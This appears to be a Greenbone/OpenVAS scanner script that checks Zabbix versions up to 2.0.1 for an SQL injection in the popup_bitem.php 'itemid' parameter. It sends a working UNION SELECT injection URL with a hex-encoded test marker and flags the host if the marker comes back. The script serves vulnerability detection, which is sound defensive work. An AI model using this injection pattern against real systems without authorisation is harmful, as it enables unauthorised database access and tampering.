CPE = "cpe:/a:zabbix:zabbix";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103525" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_name( "ZABBIX popup_bitem.php 'itemid' Parameter SQL Injection Vulnerabilit" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2012-07-25 11:34:16 +0100 (Wed, 25 Jul 2012)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "zabbix_web_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Zabbix/Web/installed" );
	script_xref( name: "URL", value: "https://support.zabbix.com/browse/ZBX-5348" );
	script_tag( name: "summary", value: "ZABBIX is prone to an SQL-injection vulnerability because it fails
  to sufficiently sanitize user-supplied data before using it in an
  SQL query." );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities
  in the underlying database." );
	script_tag( name: "affected", value: "ZABBIX versions 2.0.1 and earlier are affected." );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more details." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/popup_bitem.php?itemid=1+union+select+1,2,3,4,5,0x53514c2d496e6a656374696f6e2d54657374,7,8,9,10,11,12,13,14,15,16,17,18,19,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%23&dstfrm=1";
if(http_vuln_check( port: port, url: url, pattern: "SQL-Injection-Test" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

